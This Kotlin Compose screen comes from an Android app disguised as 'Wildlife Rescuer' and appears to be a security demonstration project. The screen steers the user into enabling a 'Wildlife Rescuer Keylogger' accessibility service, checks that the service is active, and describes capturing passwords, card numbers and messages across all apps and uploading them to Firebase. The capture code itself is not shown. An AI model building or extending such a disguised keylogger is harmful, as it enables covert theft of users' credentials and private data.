package com.example.wildliferescuer.screens

import android.content.Intent
import android.provider.Settings
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ArrowBack
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import android.provider.Settings.Secure

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun KeyloggerTestScreen(
    onBack: () -> Unit
) {
    val context = LocalContext.current
    
    var isServiceEnabled by remember { mutableStateOf(false) }
    var testLogs by remember { mutableStateOf<List<String>>(emptyList()) }
    
    // Check if accessibility service is enabled
    LaunchedEffect(Unit) {
        isServiceEnabled = isAccessibilityServiceEnabled(context)
    }
    
    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Keylogger") },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.Default.ArrowBack, "Back")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.errorContainer
                )
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(16.dp)
                .verticalScroll(rememberScrollState()),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // Extreme Warning Card
            Card(
                modifier = Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(
                    containerColor = MaterialTheme.colorScheme.errorContainer
                )
            ) {
                Row(
                    modifier = Modifier.padding(16.dp),
                    horizontalArrangement = Arrangement.spacedBy(12.dp),
                    verticalAlignment = Alignment.Top
                ) {
                    Icon(
                        Icons.Default.Warning,
                        contentDescription = null,
                        tint = MaterialTheme.colorScheme.error,
                        modifier = Modifier.size(32.dp)
                    )
                    Column {
                        Text(
                            "⚠️ EXTREME PRIVACY VIOLATION",
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.Bold,
                            color = MaterialTheme.colorScheme.error
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        Text(
                            "Keyloggers capture ALL typed text including passwords, credit cards, and private messages. This is one of the most invasive malware types!",
                            style = MaterialTheme.typography.bodySmall
                        )
                    }
                }
            }
            
            // Status Card
            Card(
                modifier = Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(
                    containerColor = if (isServiceEnabled) 
                        MaterialTheme.colorScheme.errorContainer
                    else MaterialTheme.colorScheme.surfaceVariant
                )
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        if (isServiceEnabled) {
                            Icon(
                                Icons.Default.CheckCircle,
                                contentDescription = null,
                                tint = MaterialTheme.colorScheme.error
                            )
                        } else {
                            Text("⌨️", style = MaterialTheme.typography.headlineSmall)
                        }
                        
                        Text(
                            if (isServiceEnabled) "KEYLOGGER ACTIVE" else "Keylogger Inactive",
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.Bold,
                            color = if (isServiceEnabled) 
                                MaterialTheme.colorScheme.error 
                            else MaterialTheme.colorScheme.onSurface
                        )
                    }
                    
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    Text(
                        if (isServiceEnabled) 
                            "Currently capturing ALL keystrokes across ALL apps"
                        else 
                            "Enable accessibility service to start keylogging",
                        style = MaterialTheme.typography.bodyMedium
                    )
                }
            }
            
            // Enable Button
            if (!isServiceEnabled) {
                Button(
                    onClick = {
                        // Open accessibility settings
                        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                        context.startActivity(intent)
                        
                        testLogs = testLogs + "🔓 Opening Accessibility Settings..."
                        testLogs = testLogs + "📝 Enable 'Wildlife Rescuer Keylogger' service"
                        testLogs = testLogs + "⚠️ Grant permission to monitor all input"
                    },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = MaterialTheme.colorScheme.error
                    )
                ) {
                    Text("⚠️ Enable Keylogger Service")
                }
                
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(
                        containerColor = MaterialTheme.colorScheme.secondaryContainer
                    )
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text(
                            "Setup Instructions:",
                            style = MaterialTheme.typography.titleSmall,
                            fontWeight = FontWeight.Bold
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        Text(
                            "1. Click 'Enable Keylogger Service'\n" +
                            "2. Find 'Wildlife Rescuer' in the list\n" +
                            "3. Toggle it ON\n" +
                            "4. Grant all permissions\n" +
                            "5. Return to this screen",
                            style = MaterialTheme.typography.bodySmall
                        )
                    }
                }
            } else {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(
                        containerColor = MaterialTheme.colorScheme.errorContainer
                    )
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text(
                            "✅ Keylogger is ACTIVE",
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.Bold
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        Text(
                            "Now capturing:\n" +
                            "• All text typed in ANY app\n" +
                            "• Passwords (even hidden ones)\n" +
                            "• Search queries\n" +
                            "• Messages and emails\n" +
                            "• Credit card numbers\n" +
                            "• Everything you type!",
                            style = MaterialTheme.typography.bodySmall
                        )
                    }
                }
            }
            
            // Test Input Field
            Card(modifier = Modifier.fillMaxWidth()) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text(
                        "Test the Keylogger:",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    var testText by remember { mutableStateOf("") }
                    
                    OutlinedTextField(
                        value = testText,
                        onValueChange = { testText = it },
                        label = { Text("Type something here...") },
                        modifier = Modifier.fillMaxWidth(),
                        placeholder = { Text("Your keystrokes will be captured!") }
                    )
                    
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    Text(
                        "Check logcat to see captured keystrokes!",
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.error
                    )
                }
            }
            
            // What This Demonstrates
            Card(modifier = Modifier.fillMaxWidth()) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text(
                        "What This Demonstrates",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    val points = listOf(
                        "⌨️ Captures ALL keyboard input",
                        "🔒 Steals passwords (even hidden)",
                        "💳 Records credit card numbers",
                        "📱 Monitors across ALL apps",
                        "📧 Reads private messages",
                        "🔍 Logs search queries",
                        "☁️ Uploads to Firebase",
                        "🔇 Completely silent operation"
                    )
                    
                    points.forEach { point ->
                        Text(
                            point,
                            style = MaterialTheme.typography.bodySmall,
                            modifier = Modifier.padding(vertical = 2.dp)
                        )
                    }
                }
            }
            
            // Activity Logs
            if (testLogs.isNotEmpty()) {
                Card(modifier = Modifier.fillMaxWidth()) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text(
                            "Activity Log",
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.Bold
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        
                        testLogs.forEach { log ->
                            Text(
                                log,
                                style = MaterialTheme.typography.bodySmall,
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .background(MaterialTheme.colorScheme.surfaceVariant)
                                    .padding(8.dp)
                            )
                            Spacer(modifier = Modifier.height(4.dp))
                        }
                    }
                }
            }
            
            // Firebase Verification
            Card(
                modifier = Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(
                    containerColor = MaterialTheme.colorScheme.secondaryContainer
                )
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text(
                        "Verify Results in Firebase",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    Text(
                        "Collections to check:\n" +
                        "• keylogger_sessions\n" +
                        "• captured_keystrokes\n" +
                        "• keylogger_events",
                        style = MaterialTheme.typography.bodySmall
                    )
                    
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    Text(
                        "Monitor logcat:\n" +
                        "adb logcat -s MALICIOUS_APP:* | grep KEYSTROKE",
                        style = MaterialTheme.typography.bodySmall,
                        fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace
                    )
                }
            }
        }
    }
}

/**
 * Check if accessibility service is enabled
 */
private fun isAccessibilityServiceEnabled(context: android.content.Context): Boolean {
    val service = "${context.packageName}/com.example.wildliferescuer.malicious.KeyloggerService"
    
    try {
        val enabledServices = Secure.getString(
            context.contentResolver,
            Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        
        return enabledServices?.contains(service) == true
    } catch (e: Exception) {
        return false
    }
}
